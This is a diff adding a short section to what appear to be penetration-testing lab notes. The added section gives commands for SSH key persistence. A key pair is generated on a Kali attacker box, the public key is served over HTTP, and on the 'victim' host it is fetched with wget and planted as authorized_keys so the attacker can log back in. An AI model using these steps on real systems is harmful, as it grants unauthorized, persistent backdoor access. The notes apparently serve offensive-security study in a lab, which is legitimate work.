@@ -19,6 +19,27 @@ chmod 0600 /home/bob/.ssh/authorized_keys
 chmod 600 ~/lab/bob/.ssh/id_rsa 
 ssh -i ~/lab/bob/.ssh/id_rsa bob@192.168.200.5 
 
+=================================== 
+Simplified. Make keys. Reconnect with ssh
+
+# Kali
+mkdir matt
+cd matt 
+ssh-keygen -f matt
+webup 8001
+
+# Victim
+cd /home/matt
+mkdir .ssh
+cd .ssh
+wget 192.168.162.46:8001/matt.pub
+mv matt.pub authorized_keys
+
+# Kali
+chmod 600 matt
+ssh -i matt matt@192.168.200.5
+
+
 
 =================================== 
 Persist Linux Keys via FTP
